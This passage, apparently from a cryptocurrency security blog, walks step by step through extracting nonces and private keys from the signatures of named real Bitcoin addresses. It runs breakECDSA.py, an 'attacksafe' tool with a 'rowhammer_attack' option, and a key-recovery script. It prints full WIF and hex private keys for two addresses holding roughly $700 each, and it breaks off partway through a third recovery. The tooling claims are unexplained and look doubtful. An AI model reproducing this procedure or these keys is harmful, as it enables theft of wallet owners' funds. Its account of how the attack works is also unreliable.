<pre class="wp-block-code"><code>RawTX = 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-153-1024x248.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1276"></figure>



<pre class="wp-block-code"><code>R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-154-1024x298.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1278"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-155-1024x454.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1280"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383

RawTX = 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-156-1024x96.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1282"></figure>



<p><code>(0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88 , 0xbcf3873021aff3756d237abe2c29c074c77cd585d73a919135135150fcc30197)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
point2gen  =   (0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88 , 0xbcf3873021aff3756d237abe2c29c074c77cd585d73a919135135150fcc30197)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383
R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-157.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1285"></figure>



<p><code>PrivKey = 86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18hhdfynnojmiMmBMsrkXNFWketq4mmDHB
WIF:  L1jMLZYkKr2YoTLH9xWXS9jPMgeasnTxWmGrHBK9aMCW9ahsNDzP
HEX:  86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/002-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1263"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-150-1024x445.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1266"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 708.99</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№3</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-101-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1140"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-102-1024x206.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1142"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-158-1024x95.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1292"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-159-1024x245.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1293"></figure>



<pre class="wp-block-code"><code>R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-160-1024x298.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1295"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-161-1024x453.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1296"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe

RawTX = 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-162-1024x90.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1298"></figure>



<p><code>(0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab , 0x4dd4a6ea5041635a29cafaeb019dce1848cab62c5b638dd235c3177f361f0911)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
point2gen  =   (0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab , 0x4dd4a6ea5041635a29cafaeb019dce1848cab62c5b638dd235c3177f361f0911)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe
R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-163.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1299"></figure>



<p><code>PrivKey = cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP
WIF:  L47qg9KCcGYw1WkVKGA6EH6mAdMoD5WwXCT4Gyn8UxLGPbZ14AUz
HEX:  cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/003.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1301"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-164-1024x446.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1304"><figcaption><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 698.45</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-165-1024x94.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1307"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-166-1024x242.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1308"></figure>



<pre class="wp-block-code"><code>R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-167-1024x295.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1310"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



